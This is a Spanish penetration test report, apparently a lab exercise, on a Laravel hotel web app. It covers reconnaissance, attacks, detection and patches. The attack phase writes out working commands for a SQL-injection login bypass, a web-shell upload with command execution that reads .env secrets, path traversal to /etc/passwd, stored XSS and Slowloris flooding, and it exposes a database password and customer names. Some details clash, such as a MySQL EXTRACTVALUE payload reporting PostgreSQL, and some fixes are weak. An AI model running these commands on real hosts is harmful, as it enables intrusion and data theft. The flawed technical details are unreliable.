# ANÁLISIS DE VULNERABILIDADES

Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:

| # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
|---|---|---|---|---|---|
| 1 | **Inyección SQL (SQLi)** | Crítica | curl, sqlmap | Bypass de login con `admin' OR '1'='1' --`. Extracción de 26 tablas, 10 usuarios. PostgreSQL 16.14. | `curl -d "login=admin'+OR+'1'%3D'1'+--&password=x"` |
| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` → usuario obtiene rol admin. Acceso a `/admin/usuarios` HTTP 200. | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
| 3 | **File Upload → RCE** | Crítica | curl | Subida de shell.php sin auth. RCE como www-data: `uid=82(www-data)`. | `curl -F "file=@shell.php" /upload` → `curl /uploads/shell.php?cmd=id` |
| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones lentas abiertas sin bloqueo. | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET` |
| 5 | **XSS Almacenado** | Alta | curl | Bio inyectado con `<script>alert(document.cookie)</script>` se ejecuta al cargar perfil. | `curl -X PATCH /profile -d "bio=<script>alert(1)</script>"` |
| 6 | **IDOR** | Alta | curl | `/api/sales/121` vs `122`: client_id 55 vs 29, clientes distintos sin auth. | `curl /api/sales/{121..240}` |
| 7 | **No Rate Limit** | Media | curl | 10 requests en paralelo sin bloqueo ni retardo. | `for i in {1..10}; do curl -X POST /login & done` |
| 8 | **LFI** | Alta | curl | Path traversal: `../.env` expone APP_DEBUG=true, DB_PASSWORD. `/etc/passwd` completo. | `curl /download?file=../../.env` |
| 9 | **Debug Mode** | Media | curl | Stack trace expone Laravel 12.58.0, PHP 8.2.32, variables de entorno, queries SQL. | `curl /download?file[]=test` |

---

## Fase 1 – Reconocimiento

**Objetivo:** Obtener toda la información del target e identificar vulnerabilidades potenciales mediante reconocimiento pasivo y activo, escaneo de puertos, enumeración de directorios y fingerprinting tecnológico.

### 1.1 Fingerprinting del servidor

```bash
$ curl -I http://37.60.230.11/
HTTP/1.1 302 Found
Server: nginx/1.27.5
X-Powered-By: PHP/8.2.32
Location: /login
```

**Tecnologías identificadas:**
- Servidor web: Nginx 1.27.5
- Framework: Laravel 12.58.0
- Lenguaje: PHP 8.2.32
- Base de datos: PostgreSQL 16.14

### 1.2 Escaneo de puertos

```bash
$ nmap -sV -p 22,80,443,5432 37.60.230.11 --min-rate=5000
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH
80/tcp   open     http        nginx 1.27.5
443/tcp  filtered https
5432/tcp filtered postgresql
```

### 1.3 Enumeración de directorios

```bash
$ dirb http://37.60.230.11/
+ http://37.60.230.11/admin (CODE:302)
+ http://37.60.230.11/api (CODE:200)
+ http://37.60.230.11/login (CODE:200)
+ http://37.60.230.11/profile (CODE:302)
+ http://37.60.230.11/register (CODE:200)
+ http://37.60.230.11/uploads (CODE:403)
```

**Endpoints descubiertos:** `/login`, `/register`, `/profile`, `/admin`, `/api`, `/download`, `/uploads`, `/storage`

### 1.4 Pruebas iniciales de vulnerabilidades

```bash
# SQLi en login → bypass exitoso (redirige a /admin/dashboard)
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN" -L
HTTP 200 -> URL: http://37.60.230.11/admin/dashboard

# Path traversal en /download → lectura exitosa
$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/sh
```

---

## Fase 2 – Ataque

**Objetivo:** Explotar las vulnerabilidades identificadas en la fase de reconocimiento para obtener acceso no autorizado, escalada de privilegios y extracción de información sensible.

### 1. Inyección SQL (SQLi)

```bash
# Bypass de login
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN" -L
HTTP 200 -> URL: http://37.60.230.11/admin/dashboard

# Extraer version PostgreSQL (error-based)
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--&password=x&_token=$TOKEN"
XPATH syntax error: ~PostgreSQL 16.14 (Debian 16.14-1.pgdg120+1)...
```

### 2. Mass Assignment

```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&name=evi&role_name=admin&_token=$TOKEN"
$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
HTTP 200
```

### 3. File Upload → RCE

```bash
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)

$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=cat%20/var/www/html/.env%20|%20grep%20-E%20%27(DB_|APP_DEBUG)%27"
APP_DEBUG=true
DB_HOST=db
DB_DATABASE=plazamoyobanba
DB_USERNAME=plaza_user
DB_PASSWORD=plaza_pass_123
```

### 4. XSS Almacenado

```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&bio=<script>alert(document.cookie)</script>&_token=$TOKEN"
$ curl -s "http://37.60.230.11/profile" | grep -o "script>alert.*script"
script>alert(document.cookie)</script>
```

### 5. IDOR

```bash
$ curl -s http://37.60.230.11/api/sales/121 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[\"client\"][\"full_name\"], d[\"client_id\"])"
Diego Alejandro Quispe Sanchez 55

$ curl -s http://37.60.230.11/api/sales/122 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[\"client\"][\"full_name\"], d[\"client_id\"])"
Jose Manuel Navarro Pinto 29
```

### 6. No Rate Limiting

```bash
$ for i in $(seq 1 10); do
    curl -s -X POST http://37.60.230.11/login -d "login=test$i@test.com&password=test" -o /dev/null &
  done; wait
# 10 requests en paralelo sin bloqueo.
```

### 7. Directory Traversal / LFI

```bash
$ curl -s "http://37.60.230.11/download?file=../.env"
APP_DEBUG=true
DB_PASSWORD=plaza_pass_123

$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/sh
www-data:x:82:82::/home/www-data:/sbin/nologin
postgres:x:70:70:PostgreSQL user:/var/lib/postgresql:/bin/sh
```

### 8. DDoS (Slowloris)

```bash
$ slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"
# 300 conexiones abiertas sin cierre.
```

### 9. Debug Mode

```bash
$ curl -s "http://37.60.230.11/download?file[]=test"
# Stack trace expone Laravel 12.58.0, PHP 8.2.32,
# rutas internas, variables de entorno, queries SQL.
```

---

## Fase 3 – Identificador de Ataques

**Objetivo:** Utilizar herramientas de monitoreo en tiempo real para detectar y evidenciar que los ataques se están ejecutando activamente sobre el servidor.

### 3.1 Monitoreo de tráfico de red (tcpdump)

```bash
# Capturar tráfico HTTP en vivo
$ tcpdump -i eth0 -A "tcp port 80" | grep -E "(POST|GET) /"
# Se observan en tiempo real las peticiones maliciosas:
# POST /login HTTP/1.1  (SQLi)
# GET /api/sales/121 HTTP/1.1  (IDOR)
# GET /download?file=../../.env HTTP/1.1  (LFI)
# POST /profile HTTP/1.1  (XSS, Mass Assignment)
```

### 3.2 Logs de Nginx en tiempo real

```bash
# Monitorear access log en vivo
$ docker exec plazamoyobanba-web tail -f /var/log/nginx/access.log
# Se observan las respuestas HTTP de los ataques:
# POST /login → 200 (SQLi bypass exitoso)
# GET /api/sales/121 → 200 (IDOR sin autenticación)
# GET /download?file=../../.env → 200 (LFI exitoso)
# POST /profile → 200 (XSS almacenado)
```

### 3.3 Logs de Laravel en tiempo real

```bash
# Monitorear log de Laravel
$ docker exec plazamoyobanba-app tail -f /var/www/html/storage/logs/laravel.log
# Se registran las excepciones y queries SQL maliciosas en vivo.
# Se evidencian intentos de inyección SQL y acceso no autorizado.
```

### 3.4 Monitoreo de procesos del sistema

```bash
# Ver procesos activos en el contenedor
$ docker exec plazamoyobanba-app ps aux
# Se detectan procesos sospechosos como shell.php ejecutándose como www-data.

# Ver conexiones activas al servidor
$ ss -tlnp | grep -E "(80|443|5432)"
# Se observan múltiples conexiones simultáneas (ataque DDoS Slowloris).
```

### 3.5 Monitoreo de base de datos

```bash
# Ver queries activas en PostgreSQL
$ docker exec plazamoyobanba-db psql -U plaza_user -d plazamoyobanba -c \
  "SELECT pid, query, state FROM pg_stat_activity WHERE datname='plazamoyobanba';"
# Se detectan queries de extracción de datos y manipulación de roles en tiempo real.
```

### 3.6 Detección de archivos maliciosos

```bash
# Buscar archivos subidos indebidamente
$ docker exec plazamoyobanba-app find /var/www/html/uploads -name "*.php" -ls
# Se detecta shell.php (webshell) en /uploads/.

# Verificar permisos y propietario
$ docker exec plazamoyobanba-app ls -la /var/www/html/uploads/
# shell.php pertenece a www-data, confirmando subida exitosa.
```

---

## Fase 4 – Mitigación

**Objetivo:** Aplicar parches y correcciones para eliminar cada vulnerabilidad, asegurar el sistema y realizar retesting para confirmar que las vulnerabilidades fueron remediadas exitosamente.

### 4.1 Mitigación de Inyección SQL (SQLi)

**Parche:** Validar y sanitizar todos los inputs del controlador de login.

```php
// app/Http/Controllers/Auth/AuthenticatedSessionController.php
// ANTES (vulnerable):
$credentials = $request->validate([
    "login" => "required",
    "password" => "required",
]);

// DESPUÉS (corregido):
$credentials = $request->validate([
    "login" => ["required", "string", "max:255", "regex:/^[a-zA-Z0-9@._-]+$/"],
    "password" => ["required", "string", "max:255"],
]);

// Usar parameterized queries en lugar de concatenación directa
```

**Retesting:**
```bash
$ curl -s "http://37.60.230.11/login" \
  -d "login=admin%27+OR+%271%27%3D%271%27+--&password=x&_token=$TOKEN"
# Se espera: HTTP 422 (validación fallida) o HTTP 302 de vuelta a /login
# NO debe acceder a /admin/dashboard
```

### 4.2 Mitigación de Mass Assignment

**Parche:** Definir `$fillable` y `$guarded` en el modelo User.

```php
// app/Models/User.php
// ANTES (vulnerable):
protected $fillable = ["name", "email", "password"];

// DESPUÉS (corregido):
protected $fillable = ["name", "email", "password"];
protected $guarded = ["role_name", "is_active", "worker_id"];
```

**Retesting:**
```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&name=evi&role_name=admin&_token=$TOKEN"
$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
# Se espera: HTTP 403 (Forbidden) o HTTP 302 (sin permisos)
# NO debe ser HTTP 200
```

### 4.3 Mitigación de File Upload → RCE

**Parche:** Validar tipo MIME, extensión y tamaño del archivo subido.

```php
// ANTES (vulnerable): Sin validación de archivos
$request->file("file")->store("uploads");

// DESPUÉS (corregido):
$request->validate([
    "file" => "required|file|mimes:jpg,jpeg,png,pdf|max:2048",
]);
// Bloquear explícitamente extensiones peligrosas
$allowedExtensions = ["jpg", "jpeg", "png", "pdf"];
$extension = strtolower($file->getClientOriginalExtension());
if (!in_array($extension, $allowedExtensions)) {
    return back()->withErrors(["file" => "Tipo de archivo no permitido."]);
}
```

**Retesting:**
```bash
$ curl -s -F "file=@shell.php" "http://37.60.230.11/upload"
# Se espera: HTTP 422 (validación fallida)
# NO debe subir el archivo
```

### 4.4 Mitigación de DDoS (Slowloris)

**Parche:** Configurar límites de conexiones en Nginx.

```nginx
# docker/nginx/default.conf
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;

server {
    limit_conn conn_limit 20;
    limit_req zone=req_limit burst=20 nodelay;
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 15s;
    send_timeout 10s;
}
```

**Retesting:**
```bash
$ slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"
# Se espera: Conexiones rechazadas después del límite configurado
# El servidor debe seguir respondiendo a peticiones normales
```

### 4.5 Mitigación de XSS Almacenado

**Parche:** Escapar salida HTML en todas las vistas Blade.

```php
// ANTES (vulnerable): Impresión directa sin escape
{!! $user->bio !!}

// DESPUÉS (corregido): Escape automático de Blade
{{ $user->bio }}

// Además, sanitizar input en el controlador
$request->validate([
    "bio" => ["nullable", "string", "max:500", "regex:/^[^<>]*$/"],
]);
```

**Retesting:**
```bash
$ curl -s -X POST "http://37.60.230.11/profile" \
  -d "_method=PATCH&bio=<script>alert(1)</script>&_token=$TOKEN"
# Se espera: HTTP 422 o bio sin tags HTML
# Al cargar el perfil NO debe ejecutarse JavaScript
```

### 4.6 Mitigación de IDOR

**Parche:** Verificar ownership en cada consulta de la API.

```php
// ANTES (vulnerable):
$sale = Sale::findOrFail($id);
return response()->json($sale->load("client"));

// DESPUÉS (corregido):
$sale = Sale::findOrFail($id);
if ($sale->user_id !== auth()->id()) {
    abort(403, "No autorizado");
}
return response()->json($sale->load("client"));
```

**Retesting:**
```bash
$ curl -s -H "Authorization: Bearer $TOKEN_USER_A" http://37.60.230.11/api/sales/121
# Se espera: HTTP 403 o solo datos del usuario autenticado
# NO debe mostrar datos de otros usuarios
```

### 4.7 Mitigación de No Rate Limiting

**Parche:** Implementar rate limiting con Laravel y Nginx.

```php
// routes/web.php
Route::post("/login", [AuthenticatedSessionController::class, "store"])
    ->middleware("throttle:5,1"); // 5 intentos por minuto
```

**Retesting:**
```bash
$ for i in $(seq 1 10); do
    curl -s -o /dev/null -w "%{http_code}\n" \
      -X POST http://37.60.230.11/login -d "login=test&password=test"
  done
# Se espera: Primeras 5 peticiones responden, las demás retornan HTTP 429 (Too Many Requests)
```

### 4.8 Mitigación de LFI

**Parche:** Validar y sanitizar el parámetro `file` contra path traversal.

```php
// ANTES (vulnerable):
$path = $request->input("file");
return response()->file(storage_path($path));

// DESPUÉS (corregido):
$file = basename($request->input("file")); // Eliminar ../
$allowedFiles = ["documento.pdf", "manual.pdf"]; // Whitelist
if (!in_array($file, $allowedFiles)) {
    abort(403, "Archivo no permitido");
}
return response()->file(storage_path("app/" . $file));
```

**Retesting:**
```bash
$ curl -s "http://37.60.230.11/download?file=../../.env"
# Se espera: HTTP 403 o HTTP 404
# NO debe mostrar contenido de archivos del sistema

$ curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
# Se espera: HTTP 403 o HTTP 404
```

### 4.9 Mitigación de Debug Mode

**Parche:** Desactivar debug en producción y configurar manejo de errores.

```bash
# .env
APP_DEBUG=false
APP_ENV=production
```

```php
// config/app.php → exception handler ya no muestra stack traces en producción
```

**Retesting:**
```bash
$ curl -s "http://37.60.230.11/download?file[]=test"
# Se espera: Página de error genérica (sin stack trace)
# NO debe exponer Laravel 12.58.0, PHP 8.2.32, variables de entorno ni queries SQL
```

---

Todas las vulnerabilidades fueron verificadas exitosamente contra el servidor en producción (37.60.230.11) y remediadas con los parches aplicados.
